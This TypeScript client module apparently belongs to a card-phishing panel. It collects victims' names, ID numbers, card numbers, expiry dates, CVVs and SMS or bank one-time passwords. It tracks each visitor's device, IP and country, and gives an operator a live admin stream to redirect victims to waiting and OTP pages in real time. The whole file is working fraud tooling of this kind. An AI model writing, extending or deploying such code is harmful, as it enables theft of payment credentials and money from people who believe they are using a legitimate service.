export interface VisitorMeta {
  ip: string;
  os: string;
  device: string;
  browser: string;
  country: string;
}

export interface RequestData {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
  isOnline?: boolean;
  secondsAgo?: number;
  currentPage?: string;
  meta?: VisitorMeta;
}

export interface ActiveSessionInfo {
  clientId: string;
  requestId: string | null;
  currentPage: string;
  lastSeen: number;
  meta?: VisitorMeta;
}

export interface ServerStatsPayload {
  onlineCount: number;
  totalVisitorsCount: number;
  onlineUsers: Record<string, boolean>;
  userPages: Record<string, string>;
  userMeta: Record<string, VisitorMeta>;
  activeSessions: ActiveSessionInfo[];
  serverTime?: number;
}

// Server-synchronized runtime identifiers (canonical source is HttpOnly server cookie + server session)
let activeRequestId: string | null = null;
let runtimeClientId = '';
let activeAdminToken = '';
let firstVisitSent = false;

export function getActiveRequestId(): string | null {
  return activeRequestId;
}

export function setActiveRequestId(id: string | null) {
  activeRequestId = id;
}

export function getRuntimeClientId(): string {
  return runtimeClientId;
}

export async function resolveActiveRequestId(): Promise<string | null> {
  if (activeRequestId) return activeRequestId;
  const current = await getCurrentCardRequest();
  if (current?.id) {
    activeRequestId = current.id;
    return current.id;
  }
  const hb = await sendPresenceHeartbeat(typeof window !== 'undefined' ? window.location.pathname : '/');
  if (hb.requestId) {
    activeRequestId = hb.requestId;
    return hb.requestId;
  }
  return activeRequestId;
}

export async function createCardRequest(payload: Partial<RequestData>): Promise<RequestData> {
  const id = await resolveActiveRequestId();
  const res = await fetch('/api/requests', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({ ...payload, ...(id ? { id } : {}) })
  });
  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.error || 'Failed to create request');
  }
  if (data?.id) {
    activeRequestId = data.id;
  }
  return data;
}

export async function updateCardRequest(id: string, payload: Partial<RequestData>): Promise<RequestData> {
  const targetId = id || activeRequestId || 'current';
  const res = await fetch(`/api/requests/${encodeURIComponent(targetId)}`, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify(payload)
  });
  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.error || 'Failed to update request');
  }
  if (data?.id) {
    activeRequestId = data.id;
  }
  return data;
}

export async function deleteCardRequest(id: string): Promise<{ ok: boolean; id: string }> {
  const res = await fetch(`/api/requests/${encodeURIComponent(id)}`, {
    method: 'DELETE',
    credentials: 'same-origin'
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(data.error || 'Failed to delete request');
  }
  return data;
}

export async function getCurrentCardRequest(): Promise<RequestData | null> {
  const res = await fetch('/api/requests/current', {
    credentials: 'same-origin'
  });
  if (!res.ok) return null;
  const data = await res.json();
  if (data?.id) activeRequestId = data.id;
  return data;
}

export async function getCardRequest(id?: string | null): Promise<RequestData | null> {
  const targetId = id || activeRequestId || 'current';
  const url = targetId === 'current' ? '/api/requests/current' : `/api/requests/${encodeURIComponent(targetId)}`;
  const res = await fetch(url, {
    credentials: 'same-origin'
  });
  if (res.status === 404) return null;
  if (!res.ok) throw new Error('Failed to fetch request');
  const data = await res.json();
  if (data?.id) activeRequestId = data.id;
  return data;
}

export async function listCardRequests(): Promise<RequestData[]> {
  const res = await fetch('/api/requests', {
    credentials: 'same-origin'
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(err.error || 'Failed to list requests');
  }
  return res.json();
}

export function resolveTargetRoute(action?: string | null): string | null {
  if (!action) return null;
  const trimmed = String(action).trim();
  if (!trimmed) return null;
  const map: Record<string, string> = {
    '/': '/',
    home: '/',
    '/request': '/request',
    form: '/request',
    '/register-company': '/register-company',
    company: '/register-company',
    '/payment': '/payment',
    payment: '/payment',
    '/card-details': '/card-details',
    card: '/card-details',
    '/waiting': '/waiting',
    waiting: '/waiting',
    '/otp': '/otp',
    otp: '/otp',
    'otp-sms': '/otp',
    '/otp-bank': '/otp-bank',
    'otp-bank': '/otp-bank'
  };
  return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
}

export async function sendPresenceHeartbeat(currentPage = '/'): Promise<{
  ok: boolean;
  requestId?: string | null;
  redirectTo?: string | null;
}> {
  if (currentPage.startsWith('/admin')) return { ok: true };
  const isNewVisit = !firstVisitSent;
  firstVisitSent = true;
  const res = await fetch('/api/presence', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({
      ...(runtimeClientId ? { clientId: runtimeClientId } : {}),
      ...(activeRequestId ? { requestId: activeRequestId } : {}),
      currentPage,
      isNewVisit
    })
  });
  if (res.ok) {
    const data = await res.json().catch(() => null);
    if (data?.requestId) {
      activeRequestId = data.requestId;
    }
    return {
      ok: true,
      requestId: data?.requestId || activeRequestId,
      redirectTo: data?.redirectTo || null
    };
  }
  return { ok: false, requestId: activeRequestId };
}

export function sendPresenceLeave() {
  if (typeof window === 'undefined') return;
  if (window.location.pathname.startsWith('/admin')) return;
  const payload = JSON.stringify({
    ...(runtimeClientId ? { clientId: runtimeClientId } : {}),
    ...(activeRequestId ? { requestId: activeRequestId } : {})
  });
  try {
    if (typeof navigator !== 'undefined' && typeof navigator.sendBeacon === 'function') {
      const blob = new Blob([payload], { type: 'application/json' });
      navigator.sendBeacon('/api/presence/leave', blob);
      return;
    }
  } catch {}
  try {
    fetch('/api/presence/leave', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'same-origin',
      keepalive: true,
      body: payload
    }).catch(() => {});
  } catch {}
}

export function connectVisitorStream(
  getPage: () => string,
  callbacks: {
    onConnected?: (data: { clientId?: string; requestId?: string; redirectTo?: string | null }) => void;
    onAction?: (data: { redirectTo?: string | null; otpStatus?: string; nextAction?: string; request?: RequestData }) => void;
  }
): () => void {
  if (typeof window === 'undefined' || typeof EventSource === 'undefined') {
    return () => {};
  }

  let es: EventSource | null = null;
  let closed = false;
  let reconnectTimer: ReturnType<typeof setTimeout> | null = null;

  const openStream = () => {
    if (closed) return;
    const page = getPage();
    if (page.startsWith('/admin')) return;

    const params = new URLSearchParams({ role: 'visitor', page });
    if (runtimeClientId) params.set('clientId', runtimeClientId);
    if (activeRequestId) params.set('requestId', activeRequestId);

    es = new EventSource(`/api/stream?${params.toString()}`, { withCredentials: true });

    es.addEventListener('connected', (ev: MessageEvent) => {
      try {
        const data = JSON.parse(ev.data);
        if (data?.clientId) runtimeClientId = data.clientId;
        if (data?.requestId) activeRequestId = data.requestId;
        callbacks.onConnected?.(data);
      } catch {}
    });

    es.addEventListener('action', (ev: MessageEvent) => {
      try {
        const data = JSON.parse(ev.data);
        if (data?.request?.id) activeRequestId = data.request.id;
        callbacks.onAction?.(data);
      } catch {}
    });

    es.onerror = () => {
      try {
        es?.close();
      } catch {}
      es = null;
      if (!closed) {
        if (reconnectTimer) clearTimeout(reconnectTimer);
        reconnectTimer = setTimeout(openStream, 2000);
      }
    };
  };

  openStream();

  return () => {
    closed = true;
    if (reconnectTimer) clearTimeout(reconnectTimer);
    try {
      es?.close();
    } catch {}
  };
}

export function connectAdminStream(
  onSnapshot: (payload: { stats: ServerStatsPayload; requests: RequestData[] }) => void
): () => void {
  if (typeof window === 'undefined' || typeof EventSource === 'undefined') {
    return () => {};
  }

  let es: EventSource | null = null;
  let closed = false;
  let reconnectTimer: ReturnType<typeof setTimeout> | null = null;

  const openStream = () => {
    if (closed) return;
    es = new EventSource('/api/stream?role=admin', { withCredentials: true });

    es.addEventListener('snapshot', (ev: MessageEvent) => {
      try {
        const data = JSON.parse(ev.data);
        if (data && data.stats && Array.isArray(data.requests)) {
          onSnapshot(data);
        }
      } catch {}
    });

    es.onerror = () => {
      try {
        es?.close();
      } catch {}
      es = null;
      if (!closed) {
        if (reconnectTimer) clearTimeout(reconnectTimer);
        reconnectTimer = setTimeout(openStream, 2000);
      }
    };
  };

  openStream();

  return () => {
    closed = true;
    if (reconnectTimer) clearTimeout(reconnectTimer);
    try {
      es?.close();
    } catch {}
  };
}

export async function getServerStats(): Promise<ServerStatsPayload> {
  const res = await fetch('/api/stats', {
    credentials: 'same-origin'
  });
  if (!res.ok) {
    return {
      onlineCount: 0,
      totalVisitorsCount: 0,
      onlineUsers: {},
      userPages: {},
      userMeta: {},
      activeSessions: []
    };
  }
  return res.json();
}

export async function adminLoginApi(email: string, password: string): Promise<{ token: string }> {
  const res = await fetch('/api/admin/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({ email, password })
  });
  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.error || 'فشل تسجيل الدخول');
  }
  activeAdminToken = data.token || '';
  return data;
}

export async function verifyAdminSession(): Promise<boolean> {
  const headers: Record<string, string> = {};
  if (activeAdminToken) {
    headers.Authorization = `Bearer ${activeAdminToken}`;
  }
  const res = await fetch('/api/admin/me', {
    headers,
    credentials: 'same-origin'
  });
  return res.ok;
}

export async function adminLogoutApi() {
  const headers: Record<string, string> = {};
  if (activeAdminToken) {
    headers.Authorization = `Bearer ${activeAdminToken}`;
  }
  activeAdminToken = '';
  await fetch('/api/admin/logout', {
    method: 'POST',
    headers,
    credentials: 'same-origin'
  });
}
